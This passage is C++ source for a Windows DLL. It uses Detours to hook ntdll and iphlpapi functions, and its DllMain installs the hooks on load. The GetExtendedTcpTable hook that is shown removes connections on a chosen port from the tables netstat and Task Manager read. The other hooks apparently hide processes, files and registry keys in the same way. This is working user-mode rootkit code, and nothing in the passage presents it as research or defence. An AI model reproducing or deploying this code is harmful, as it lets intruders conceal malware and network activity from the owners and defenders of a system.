static GetExtendedTcpTable_t TrueGetExtendedTcpTable = nullptr;

DWORD WINAPI HookedGetExtendedTcpTable(PVOID pTcpTable, PDWORD pdwSize, BOOL bOrder, ULONG ulAf, TCP_TABLE_CLASS TableClass, ULONG Reserved)
{
    DWORD ret = TrueGetExtendedTcpTable(pTcpTable, pdwSize, bOrder, ulAf, TableClass, Reserved);
    if (ret != NO_ERROR || !pTcpTable) return ret;

    // IPv4 TCP_TABLE_OWNER_PID_ALL (used by netstat, taskmgr, etc.)
    if (ulAf == AF_INET && (TableClass == TCP_TABLE_OWNER_PID_ALL || TableClass == TCP_TABLE_OWNER_PID_CONNECTIONS || TableClass == TCP_TABLE_OWNER_PID_LISTENER)) {
        PMIB_TCPTABLE_OWNER_PID table = (PMIB_TCPTABLE_OWNER_PID)pTcpTable;
        for (DWORD i = 0; i < table->dwNumEntries; ) {
            USHORT localPort = ntohs((USHORT)table->table[i].dwLocalPort);
            USHORT remotePort = ntohs((USHORT)table->table[i].dwRemotePort);
            if (localPort == g_hiddenPort || remotePort == g_hiddenPort) {
                Logf("Hiding TCP connection: local=%u remote=%u", localPort, remotePort);
                for (DWORD j = i; j < table->dwNumEntries - 1; j++)
                    table->table[j] = table->table[j + 1];
                table->dwNumEntries--;
            } else {
                i++;
            }
        }
    }
    // IPv4 TCP_TABLE_BASIC (simpler struct)
    else if (ulAf == AF_INET && (TableClass == TCP_TABLE_BASIC_ALL || TableClass == TCP_TABLE_BASIC_CONNECTIONS || TableClass == TCP_TABLE_BASIC_LISTENER)) {
        PMIB_TCPTABLE table = (PMIB_TCPTABLE)pTcpTable;
        for (DWORD i = 0; i < table->dwNumEntries; ) {
            USHORT localPort = ntohs((USHORT)table->table[i].dwLocalPort);
            USHORT remotePort = ntohs((USHORT)table->table[i].dwRemotePort);
            if (localPort == g_hiddenPort || remotePort == g_hiddenPort) {
                for (DWORD j = i; j < table->dwNumEntries - 1; j++)
                    table->table[j] = table->table[j + 1];
                table->dwNumEntries--;
            } else {
                i++;
            }
        }
    }
    return ret;
}

// ---- Hook thread: attach detours ----
static DWORD WINAPI HookThread(LPVOID) {
    InitHiddenNames();
    Logf("HookThread started in PID=%lu", GetCurrentProcessId());
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        Logf("GetModuleHandleA(ntdll.dll) failed GLE=%lu", GetLastError());
        return 0;
    }

    TrueNtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    TrueNtGetNextProcess = (NtGetNextProcess_t)GetProcAddress(hNtdll, "NtGetNextProcess");

    TrueNtQueryDirectoryFile = (NtQueryDirectoryFile_t)GetProcAddress(hNtdll, "NtQueryDirectoryFile");
    TrueNtQueryDirectoryFileEx = (NtQueryDirectoryFileEx_t)GetProcAddress(hNtdll, "NtQueryDirectoryFileEx");
    TrueNtQueryKey = (NtQueryKey_t)GetProcAddress(hNtdll, "NtQueryKey");
    TrueNtEnumerateKey = (NtEnumerateKey_t)GetProcAddress(hNtdll, "NtEnumerateKey");
    TrueNtEnumerateValueKey = (NtEnumerateValueKey_t)GetProcAddress(hNtdll, "NtEnumerateValueKey");

    // TCP hook: GetExtendedTcpTable from iphlpapi.dll
    HMODULE hIphlpapi = LoadLibraryA("iphlpapi.dll");
    if (hIphlpapi) {
        TrueGetExtendedTcpTable = (GetExtendedTcpTable_t)GetProcAddress(hIphlpapi, "GetExtendedTcpTable");
        Logf("GetExtendedTcpTable resolved: %p", TrueGetExtendedTcpTable);
    }

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());

    if (TrueNtQuerySystemInformation) DetourAttach((PVOID*)&TrueNtQuerySystemInformation, HookedNtQuerySystemInformation);
    if (TrueNtGetNextProcess) DetourAttach((PVOID*)&TrueNtGetNextProcess, HookedNtGetNextProcess);
    if (TrueNtQueryDirectoryFile) DetourAttach((PVOID*)&TrueNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
    if (TrueNtQueryDirectoryFileEx) DetourAttach((PVOID*)&TrueNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
    if (TrueNtQueryKey) DetourAttach((PVOID*)&TrueNtQueryKey, HookedNtQueryKey);
    if (TrueNtEnumerateKey) DetourAttach((PVOID*)&TrueNtEnumerateKey, HookedNtEnumerateKey);
    if (TrueNtEnumerateValueKey) DetourAttach((PVOID*)&TrueNtEnumerateValueKey, HookedNtEnumerateValueKey);
    if (TrueGetExtendedTcpTable) DetourAttach((PVOID*)&TrueGetExtendedTcpTable, HookedGetExtendedTcpTable);

    LONG st = DetourTransactionCommit();
    Logf("DetourTransactionCommit returned %ld", st);

    return 0;
}

// ---- DllMain: TLS alloc and attach/detach ----
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
        g_hInstance = hinstDLL;
        LogInit();
        Logf("DllMain ATTACH: PID=%lu", GetCurrentProcessId());

        // allocate TLS indices
        gTls_EnumerateKey_CacheKey = TlsAlloc();
        gTls_EnumerateKey_CacheIndex = TlsAlloc();
        gTls_EnumerateKey_CacheI = TlsAlloc();
        gTls_EnumerateKey_CacheCorrected = TlsAlloc();

        gTls_EnumerateValueKey_CacheKey = TlsAlloc();
        gTls_EnumerateValueKey_CacheIndex = TlsAlloc();
        gTls_EnumerateValueKey_CacheI = TlsAlloc();
        gTls_EnumerateValueKey_CacheCorrected = TlsAlloc();

        DisableThreadLibraryCalls(hinstDLL);
        HANDLE th = CreateThread(NULL, 0, HookThread, NULL, 0, NULL);
        if (th) CloseHandle(th);
    }
    else if (fdwReason == DLL_PROCESS_DETACH) {
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        if (TrueNtQuerySystemInformation) DetourDetach((PVOID*)&TrueNtQuerySystemInformation, HookedNtQuerySystemInformation);
        if (TrueNtGetNextProcess) DetourDetach((PVOID*)&TrueNtGetNextProcess, HookedNtGetNextProcess);
        if (TrueNtQueryDirectoryFile) DetourDetach((PVOID*)&TrueNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
        if (TrueNtQueryDirectoryFileEx) DetourDetach((PVOID*)&TrueNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
        if (TrueNtQueryKey) DetourDetach((PVOID*)&TrueNtQueryKey, HookedNtQueryKey);
        if (TrueNtEnumerateKey) DetourDetach((PVOID*)&TrueNtEnumerateKey, HookedNtEnumerateKey);
        if (TrueNtEnumerateValueKey) DetourDetach((PVOID*)&TrueNtEnumerateValueKey, HookedNtEnumerateValueKey);
        if (TrueGetExtendedTcpTable) DetourDetach((PVOID*)&TrueGetExtendedTcpTable, HookedGetExtendedTcpTable);
        DetourTransactionCommit();

        // free TLS indices
        if (gTls_EnumerateKey_CacheKey != TLS_OUT_OF_INDEXES) { TlsFree(gTls_EnumerateKey_CacheKey); TlsFree(gTls_EnumerateKey_CacheIndex); TlsFree(gTls_EnumerateKey_CacheI); TlsFree(gTls_EnumerateKey_CacheCorrected); }
        if (gTls_EnumerateValueKey_CacheKey != TLS_OUT_OF_INDEXES) { TlsFree(gTls_EnumerateValueKey_CacheKey); TlsFree(gTls_EnumerateValueKey_CacheIndex); TlsFree(gTls_EnumerateValueKey_CacheI); TlsFree(gTls_EnumerateValueKey_CacheCorrected); }

        LogClose();
    }
    return TRUE;
}
